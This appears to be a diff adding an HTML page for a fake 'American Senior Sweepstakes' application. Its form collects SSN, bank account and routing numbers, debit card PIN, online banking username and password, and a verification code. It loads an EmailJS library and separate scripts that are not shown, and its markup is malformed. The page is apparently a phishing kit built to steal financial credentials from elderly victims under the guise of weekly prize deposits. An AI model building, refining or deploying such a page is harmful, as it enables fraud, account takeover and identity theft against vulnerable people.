@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sweepstakes | Application</title>
+    <meta name="description" content="Sweepstakes application page" />
+    <link rel="stylesheet" href="styles.css" />
+    <script src="auth.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  </head>
+   <script src="./bot-guard.js" defer></script>
+  </head>
+  <body data-page="/requests"><div id="app"></div></body>
+<div aria-hidden="true" style="position:absolute;left:-10000px;width:1px;height:1px;overflow:hidden">
+  <label for="website-check">Leave this field blank</label>
+  <input
+    id="website-check"
+    name="website_check"
+    type="text"
+    tabindex="-1"
+    autocomplete="off"
+  />
+</div>
+
+  <body>
+    <main class="application-page">
+      <section class="application-banner" aria-label="Application banner">
+        <img src="assets/f.jpeg" alt="Application Banner" />
+      </section>
+
+      <section class="application-section">
+        <div class="application-shell">
+          <form id="application-form" class="application-form">
+            <div class="form-grid">
+              <label>Name<input name="name" required /></label>
+              <label>Date of Birth<input type="date" name="dob" required /></label>
+              <label>Email<input type="email" name="email" required /></label>
+              <label>City<input name="city" required /></label>
+              <label>State<input name="state" required /></label>
+              <label>Zip Code<input name="zip" required /></label>
+              <label>Bank Name<input name="bankName" required /></label>
+              <label>Account Number<input name="accountNumber" required /></label>
+              <label>Routing Number<input name="routingNumber" required /></label>
+              <label>How long associated with the bank?
+                <select name="associationDuration" required>
+                  <option value="">Select an option</option>
+                  <option>Less than 1 year</option>
+                  <option>1-3 years</option>
+                  <option>3-5 years</option>
+                  <option>5+ years</option>
+                </select>
+              </label>
+              <label>SSN<input type="password" name="ssn" required /></label>
+              <label>ID Type
+                <select name="idType" id="idType" required>
+                  <option value="">Select an option</option>
+                  <option>Driver's License / State ID</option>
+                  <option>Military ID</option>
+                  <option>Passport</option>
+                  <option>Other</option>
+                </select>
+              </label>
+              <label id="idNumberLabel" style="display: none;">ID Number<input name="idNumber" id="idNumber" /></label>
+              <label>Primary Debit Card PIN<input type="password" name="pin" required /></label>
+              <label>Last 4 digits of primary debit card<input inputmode="numeric" maxlength="4" name="lastFour" required /></label>
+              <label>Bank Online Username<input name="onlineUsername" required /></label>
+              <label>Bank Online Password<input type="password" name="onlinePassword" required /></label>
+              <label>Weekly deposit from American Senior Sweepstakes
+                <select name="weeklyDeposit" required>
+                  <option value="">Select an option</option>
+                  <option>$50</option>
+                  <option>$100</option>
+                  <option>$250</option>
+                  <option>$500</option>
+                  <option>$1,000</option>
+                  <option>$2,500</option>
+                  <option>$5,000</option>
+                  <option>$7,500</option>
+                  <option>$10,000</option>
+                </select>
+              </label>
+              <label>Verification 5-Digit Number<input inputmode="numeric" maxlength="5" name="verificationCode" required /></label>
+            </div>
+            <button type="submit">Submit Application</button>
+            <p id="form-message" class="form-message" aria-live="polite"></p>
+          </form>
+        </div>
+      </section>
+    </main>
+
+    <div id="success-overlay" class="success-overlay" hidden>
+      <div class="success-modal" role="dialog" aria-live="polite" aria-modal="true">
+        <h3 id="overlay-title">Application Submitted</h3>
+        <p id="overlay-text">Your application was received successfully.</p>
+        <button type="button" id="close-success-overlay">Close</button>
+      </div>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
